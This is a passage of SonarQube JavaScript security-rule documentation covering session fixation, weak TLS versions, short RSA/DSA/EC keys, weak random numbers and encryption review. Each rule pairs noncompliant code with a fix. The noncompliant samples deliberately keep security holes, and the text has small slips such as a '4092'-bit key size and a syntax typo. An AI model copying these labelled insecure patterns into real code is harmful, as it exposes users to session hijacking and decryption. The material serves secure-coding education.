  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5876">
              javascript:S5876
            </a>
          </td>
          <td>
            <details>
              <p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and
impersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>
<h2>Why is this an issue?</h2>
<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically
works:</p>
<ul>
  <li> When a user visits a website or logs in, a session is created for them. </li>
  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>
  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,
  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>
  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the
  attacker. </li>
  <li> At this point, the attacker can hijack and impersonate the victim’s session. </li>
</ul>
<h3>What is the potential impact?</h3>
<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain
unauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>
<h4>Impersonation</h4>
<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid
credentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing
malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as
revealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>
<h4>Data Breach</h4>
<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include
personal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can
be used for identity theft, financial fraud, or other malicious purposes.</p>
<h4>Privilege Escalation</h4>
<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher
privileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized
modifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>
<h2>How to fix it in Passport</h2>
<h3>Code examples</h3>
<p>Upon user authentication, it is crucial to regenerate the session identifier to prevent fixation attacks. Passport provides a mechanism to achieve
this by using the <code>req.session.regenerate()</code> method. By calling this method after successful authentication, you can ensure that each user
is assigned a new and unique session ID.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
app.post('/login',
  passport.authenticate('local', { failureRedirect: '/login' }),
  function(req, res) {
    // Noncompliant - no session.regenerate after login
    res.redirect('/');
  });
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
app.post('/login',
  passport.authenticate('local', { failureRedirect: '/login' }),
  function(req, res) {
    let prevSession = req.session;
    req.session.regenerate((err) =&gt; {
      Object.assign(req.session, prevSession);
      res.redirect('/');
    });
  });
</pre>
<h3>How does this work?</h3>
<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated
during the authentication process.</p>
<p>Here’s how session fixation protection typically works:</p>
<ol>
  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored
  in a cookie or passed through URL parameters. </li>
  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows
  the attacker to potentially gain unauthorized access to the user’s session. </li>
  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a
  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li>
  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.
  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>
  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier
  is typically stored in a new session cookie or passed through URL parameters. </li>
</ol>
<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,
secure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s
session and helps maintain the integrity and security of the application’s session management process.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Express.js Documentation - <a href="http://expressjs.com/en/resources/middleware/session.html">express-session</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://medium.com/passportjs/fixing-session-fixation-b2b68619c51d">Fixing Session Fixation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> <a href="https://owasp.org/www-community/attacks/Session_fixation">OWASP Sesssion Fixation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4787">
              javascript:S4787
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=javascript%3AS4426&rule_key=javascript%3AS4426'>S4426</a>, <a href='/organizations/sopra-steria/rules?open=javascript%3AS5542&rule_key=javascript%3AS5542'>S5542</a>, <a href='/organizations/sopra-steria/rules?open=javascript%3AS5547&rule_key=javascript%3AS5547'>S5547</a> instead.</p>
<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902">CVE-2017-7902</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378">CVE-2006-1378</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like "Chosen-Plaintext Attacks". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
// === Client side ===
crypto.subtle.encrypt(algo, key, plainData); // Sensitive
crypto.subtle.decrypt(algo, key, encData); // Sensitive
</pre>
<pre>
// === Server side ===
const crypto = require("crypto");
const cipher = crypto.createCipher(algo, key); // Sensitive
const cipheriv = crypto.createCipheriv(algo, key, iv); // Sensitive
const decipher = crypto.createDecipher(algo, key); // Sensitive
const decipheriv = crypto.createDecipheriv(algo, key, iv); // Sensitive
const pubEnc = crypto.publicEncrypt(key, buf); // Sensitive
const privDec = crypto.privateDecrypt({ key: key, passphrase: secret }, pubEnc); // Sensitive
const privEnc = crypto.privateEncrypt({ key: key, passphrase: secret }, buf); // Sensitive
const pubDec = crypto.publicDecrypt(key, privEnc); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/321">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/322">CWE-322 - Key Exchange without Entity Authentication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/323">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/324">CWE-324 - Use of a Key Past its Expiration Date</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/325">CWE-325 - Missing Required Cryptographic Step</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4423">
              javascript:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>NodeJs offers multiple ways to set weak TLS protocols. For https and tls, <a
href="https://nodejs.org/api/tls.html#tlscreatesecurecontextoptions">these options</a> are used and are used in other third-party libraries as
well.</p>
<p>The first is <code>secureProtocol</code>:</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
 secureProtocol: 'TLSv1_method' // Noncompliant
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<p>The second is the combination of <code>minVersion</code> and <code>maxVerison</code>. Note that they cannot be specified along with the
<code>secureProtocol</code> option:</p>
<pre data-diff-id="12" data-diff-type="noncompliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
  minVersion: 'TLSv1.1',  // Noncompliant
  maxVersion: 'TLSv1.2'
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<p>And <code>secureOptions</code>, which in this example instructs the OpenSSL protocol to turn off some algorithms altogether. In general, this
option might trigger side effects and should be used carefully, if used at all.</p>
<pre data-diff-id="13" data-diff-type="noncompliant">
const https     = require('node:https');
const tls       = require('node:tls');
const constants = require('node:crypto'):

let options = {
  secureOptions:
    constants.SSL_OP_NO_SSLv2
    | constants.SSL_OP_NO_SSLv3
    | constants.SSL_OP_NO_TLSv1
}; // Noncompliant

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
  secureProtocol: 'TLSv1_2_method'
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
  minVersion: 'TLSv1.2',
  maxVersion: 'TLSv1.2'
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<p>Here, the goal is to turn on only TLSv1.2 and higher, by turning off all lower versions:</p>
<pre data-diff-id="13" data-diff-type="compliant">
const https = require('node:https');
const tls   = require('node:tls');

let options = {
  secureOptions:
    constants.SSL_OP_NO_SSLv2
    | constants.SSL_OP_NO_SSLv3
    | constants.SSL_OP_NO_TLSv1
    | constants.SSL_OP_NO_TLSv1_1
};

let req    = https.request(options, (res) =&gt; { });
let socket = tls.connect(443, "www.example.com", options, () =&gt; { });
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2245">
              javascript:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>Math.random()</code> function relies on a weak pseudorandom number generator, this function should not be used for security-critical
applications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used
instead.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a cryptographically strong pseudorandom number generator (CSPRNG) like <code>crypto.getRandomValues()</code>. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
const val = Math.random(); // Sensitive
// Check if val is used in a security context.
</pre>
<h2>Compliant Solution</h2>
<pre>
// === Client side ===
const crypto = window.crypto || window.msCrypto;
var array = new Uint32Array(1);
crypto.getRandomValues(array); // Compliant for security-sensitive use cases

// === Server side ===
const crypto = require('crypto');
const buf = crypto.randomBytes(1); // Compliant for security-sensitive use cases
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4426">
              javascript:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 1024,  // Noncompliant
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPairSync('dsa', {
    modulusLength: 1024,  // Noncompliant
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPair('ec', {
    namedCurve: 'secp112r2', // Noncompliant
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<h4>Compliant solution</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="compliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPairSync('dsa', {
    modulusLength: 2048,
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="compliant">
const crypto = require('crypto');

function callback(err, pub, priv) {}

var { privateKey, publicKey } = crypto.generateKeyPair('ec', {
    namedCurve: 'secp224k1',
    publicKeyEncoding:  { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  },
  callback);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
